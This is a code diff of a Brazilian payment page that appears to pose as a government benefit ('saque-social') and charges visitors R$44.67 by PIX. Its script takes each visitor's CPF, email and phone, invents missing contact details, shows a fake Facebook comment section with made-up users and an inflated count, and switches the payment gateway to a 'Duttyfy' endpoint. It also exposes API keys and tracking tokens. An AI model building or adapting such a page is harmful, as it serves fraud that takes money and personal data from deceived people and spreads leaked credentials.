@@ -274,15 +274,13 @@ document.head.appendChild(a);
 </footer>
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
 <script>
-  var PARADISE_API_URL  = 'https://multi.paradisepags.com/api/v1';
-  var PARADISE_API_KEY  = 'sk_220715873acbf9718fdd92d1d08b541320f5c7c711b5017be8cb91edc9192bdf';
+  /* ── DUTTYFY PIX API ── */
+  var DUTTYFY_PIX_URL   = 'https://www.pagamentos-seguros.app/api-pix/zqaSpcAug94Zdb8cr3WnAmHjnIwYcheVmU-Cd5kvpKXbQLm0xVtsztoGScRruPtE6EdIOhgH8KaRETL6KtECrQ';
   var PIX_VALOR_CENTS   = 4467;
   var PIX_DESCRICAO     = 'Front';
   var PIX_REDIRECT      = 'https://govbeneficio.vercel.app/up1.html';
-
-  /* ── HASH DO PRODUTO (use este valor ao cadastrar o produto na Paradise / UTMify) ── */
+  /* ── HASH DO PRODUTO (UTMify) ── */
   var PARADISE_PRODUCT_HASH = 'prod_7333c0ff75106325';
-
   /* ── CREDENCIAL DA API UTMIFY ── */
   var UTMIFY_API_TOKEN = 'hLLRiNJhaIzqdivrzVY7PLr1zH3sia014pMW';
 
@@ -293,7 +291,6 @@ document.head.appendChild(a);
   var _cpf=(_p.get('cpf')||'').replace(/\D/g,'');
   var _email=(_p.get('email')||'cliente@email.com').trim();
   var _fone=(_p.get('telefone')||'11999999999').replace(/\D/g,'');
-
   /* ── CAPTURA DE PARÂMETROS UTM ── */
   var _utm_source   = _p.get('utm_source')   || '';
   var _utm_medium   = _p.get('utm_medium')   || '';
@@ -325,12 +322,11 @@ document.head.appendChild(a);
       var agoraStr = utmifyFmtDate(agora);
       var nomeEnvio = nomeOk || 'Cliente Pagador';
       if (nomeEnvio.trim().split(' ').filter(Boolean).length < 2) nomeEnvio += ' Pagador';
-
       var body = {
         orderId:       _pixTxid,
         platform:      'custom',
         paymentMethod: 'pix',
-        status:        status,                          /* 'waiting_payment' | 'paid' */
+        status:        status,
         createdAt:     _pixCreatedAt || agoraStr,
         approvedDate:  status === 'paid' ? agoraStr : null,
         refundedAt:    null,
@@ -370,7 +366,6 @@ document.head.appendChild(a);
           sck: _sck
         }
       };
-
       await fetch('https://api.utmify.com.br/api-credentials/orders', {
         method:  'POST',
         headers: {
@@ -423,8 +418,10 @@ document.head.appendChild(a);
     var numero = '9' + String(Math.floor(Math.random()*90000000+10000000));
     return ddd + numero;
   }
+
   var nomeOk=formatarNome(_nome);
   if(nomeOk) document.getElementById('header-user-name').textContent=nomeOk.split(' ')[0];
+
   function ttqIdentify(){try{var d={};if(_email&&_email.indexOf('@')>0)d.email=_email;if(_fone)d.phone_number='+55'+_fone.replace(/\D/g,'');if(Object.keys(d).length)ttq.identify(d);}catch(e){}}
   function ttqConteudo(){return{content_id:'saque-social',content_name:PIX_DESCRICAO,content_type:'product',currency:'BRL',value:parseFloat((PIX_VALOR_CENTS/100).toFixed(2)),quantity:1};}
   function ttqViewContent(){try{ttq.track('ViewContent',ttqConteudo());}catch(e){}}
@@ -432,6 +429,7 @@ document.head.appendChild(a);
   function ttqAddPaymentInfo(){try{ttq.track('AddPaymentInfo',ttqConteudo());}catch(e){}}
   function ttqPurchase(){try{ttq.track('Purchase',{content_id:'saque-social',content_name:PIX_DESCRICAO,content_type:'product',currency:'BRL',value:parseFloat((PIX_VALOR_CENTS/100).toFixed(2)),quantity:1,transaction_id:String(_pixTxid)});}catch(e){}}
 
+  /* ── CRIA COBRANÇA PIX VIA DUTTYFY ── */
   async function pixIniciar(){
     document.getElementById('pix-loading').style.display='block';
     document.getElementById('pix-erro').style.display='none';
@@ -445,35 +443,38 @@ document.head.appendChild(a);
       var cpfEnvio=_cpf.replace(/\D/g,'');
       var emailEnvio=_email&&_email.indexOf('@')>0?_email:gerarEmailAleatorio();
       var foneEnvio=(_fone||'').replace(/\D/g,'')||gerarFoneAleatorio();
-      var referencia='SS-'+Date.now()+'-'+Math.floor(Math.random()*9000+1000);
+
+      /* Captura todos os parâmetros de rastreamento da URL atual */
+      var utmStr=window.location.search.replace(/^\?/,'');
+
       var payload={
         amount: PIX_VALOR_CENTS,
-        description: PIX_DESCRICAO,
-        reference: referencia,
-        source: 'api_externa',
-        productHash: PARADISE_PRODUCT_HASH,
         customer:{
-          name: nomeEnvio,
-          email: emailEnvio,
-          phone: foneEnvio,
-          document: cpfEnvio
+          name:     nomeEnvio,
+          document: cpfEnvio,
+          email:    emailEnvio,
+          phone:    foneEnvio
         },
-        tracking:{
-          utm_source:   _utm_source,
-          utm_medium:   _utm_medium,
-          utm_campaign: _utm_campaign,
-          utm_content:  _utm_content,
-          utm_term:     _utm_term,
-          src:          _src,
-          sck:          _sck
-        }
+        item:{
+          title:    PIX_DESCRICAO,
+          price:    PIX_VALOR_CENTS,
+          quantity: 1
+        },
+        paymentMethod: 'PIX',
+        utm: utmStr
       };
-      var res=await fetch(PARADISE_API_URL+'/transaction.php',{method:'POST',headers:{'Content-Type':'application/json','X-API-Key':PARADISE_API_KEY},body:JSON.stringify(payload)});
+
+      var res=await fetch(DUTTYFY_PIX_URL,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify(payload)
+      });
       var data=await res.json();
-      if(!res.ok||data.status!=='success'||!data.qr_code)throw new Error('Erro');
-      _pixTxid=data.transaction_id;
-      _pixCode=data.qr_code;
-      _pixCreatedAt=utmifyFmtDate(new Date()); /* salva o momento de criação */
+      if(!res.ok||!data.pixCode||!data.transactionId)throw new Error('Erro');
+
+      _pixTxid=data.transactionId;
+      _pixCode=data.pixCode;
+      _pixCreatedAt=utmifyFmtDate(new Date());
 
       var valorFmt='R$ '+(PIX_VALOR_CENTS/100).toFixed(2).replace('.',',');
       document.getElementById('pix-nome-show').textContent=nomeOk||'Cliente';
@@ -481,17 +482,20 @@ document.head.appendChild(a);
       document.getElementById('pix-valor-label').textContent=valorFmt;
       document.getElementById('pix-valor-topo').textContent=valorFmt;
       document.getElementById('pix-code-box').textContent=_pixCode;
+
+      /* QR Code gerado a partir do pixCode (string EMV) */
       var wrap=document.getElementById('pix-qr-img');wrap.innerHTML='';
       var imgEl=document.createElement('img');
-      var b64=data.qr_code_base64;
-      imgEl.src=b64?(b64.startsWith('data:image')?b64:'data:image/png;base64,'+b64):'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(_pixCode);
+      imgEl.src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(_pixCode);
       imgEl.style.cssText='border-radius:8px;max-width:190px;';
       wrap.appendChild(imgEl);_pixQRFeito=true;
+
       document.getElementById('pix-loading').style.display='none';
       document.getElementById('pix-main').style.display='block';
+
       ttqViewContent();
       ttqInitiateCheckout();
-      utmifyNotificar('waiting_payment'); /* ← venda PENDENTE na UTMify */
+      utmifyNotificar('waiting_payment');
       pixPolling();
     }catch(err){
       document.getElementById('pix-loading').style.display='none';
@@ -499,19 +503,20 @@ document.head.appendChild(a);
     }
   }
 
+  /* ── POLLING DE STATUS VIA DUTTYFY ── */
   function pixPolling(){
     if(!_pixTxid)return;
     var tentativas=0;
     _pixTimer=setInterval(async function(){
       tentativas++;if(tentativas>180){clearInterval(_pixTimer);return;}
       try{
-        var r=await fetch(PARADISE_API_URL+'/query.php?action=get_transaction&id='+encodeURIComponent(_pixTxid),{headers:{'X-API-Key':PARADISE_API_KEY}});
+        var r=await fetch(DUTTYFY_PIX_URL+'?transactionId='+encodeURIComponent(_pixTxid));
         var s=await r.json();
-        if(s.status==='approved'){
+        if(s.status==='COMPLETED'){
           clearInterval(_pixTimer);
           ttqPurchase();
-          await utmifyNotificar('paid'); /* ← venda APROVADA na UTMify */
-          setTimeout(function(){ window.location.href=utmRedirectUrl(); },800);
+          await utmifyNotificar('paid');
+          setTimeout(function(){window.location.href=utmRedirectUrl();},800);
         }
       }catch(e){}
     },5000);
@@ -523,6 +528,7 @@ document.head.appendChild(a);
     document.getElementById('ppane-copia').classList.toggle('on',aba==='copia');
     document.getElementById('ppane-qr').classList.toggle('on',aba==='qr');
   }
+
   function pixCopiar(){
     if(!_pixCode)return;
     var btn=document.getElementById('pix-copy-btn');var orig=btn.innerHTML;
@@ -532,6 +538,7 @@ document.head.appendChild(a);
   }
   function _fbCopy(){var el=document.createElement('textarea');el.value=_pixCode;el.style.cssText='position:fixed;opacity:0;top:0;left:0;';document.body.appendChild(el);el.focus();el.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(el);}
   function pixToggle(hd){var bd=hd.nextElementSibling;var ic=hd.querySelector('i');ic.style.transform=bd.classList.toggle('open')?'rotate(0deg)':'rotate(180deg)';}
+
   var totalComments=25738,storedComments=[];
   function initFacebookComments(){
     document.getElementById('fb-header-outside').textContent='Comentários ('+totalComments+')';
@@ -543,6 +550,7 @@ document.head.appendChild(a);
   async function createRandomComment(text,initial){totalComments++;var ud=await getRandomUser();createComment(ud.name.first,ud.picture.medium,text,0,0,initial);storedComments.unshift({name:ud.name.first,avatar:ud.picture.medium,text:text,likes:0,dislikes:0});}
   function createComment(name,avatar,text,likes,dislikes,initialLoad){var el=document.createElement('div');el.classList.add('comment-item');el.innerHTML='<img class="comment-avatar" src="'+avatar+'"/><div class="comment-content"><div class="comment-name">'+name+'</div><div class="comment-text">'+text+'</div><div class="comment-actions"><span class="comment-likes"><i class="fas fa-thumbs-up"></i> '+likes+'</span></div></div>';var c=document.getElementById('fb-comments-container');c.insertBefore(el,c.firstChild);}
   async function getRandomUser(){var r=await fetch('https://randomuser.me/api/?nat=br');return(await r.json()).results[0];}
+
   initFacebookComments();
   pixIniciar();
 </script>
